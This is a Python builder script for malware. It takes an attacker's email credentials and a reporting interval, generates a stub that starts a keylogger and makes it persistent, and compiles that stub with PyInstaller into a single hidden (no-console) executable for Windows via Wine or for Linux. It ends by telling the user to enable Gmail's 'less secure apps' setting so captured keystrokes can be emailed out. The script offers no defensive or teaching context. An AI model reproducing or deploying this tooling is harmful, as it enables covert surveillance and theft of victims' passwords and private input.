#!/usr/bin/env python
import argparse
import subprocess
import os


WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

email=input("Enter Email id: ")
password=input("Enter password: ")
interval=int(input("Enter interval time: "))
out=input("Enter the output filename: ")
win=True if(input("If windows press Y: ")=='Y' ) else False

def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("zlogger = keylogger.Keylogger(" + str(interval) + ",'" + email + "','" + password + "')\n")
        file.write("zlogger.become_persistent()\n")
        file.write("zlogger.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

create_keylogger(out,interval,email,password)

if win:
    compile_for_windows(out)

else:
    compile_for_linux(out)

print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
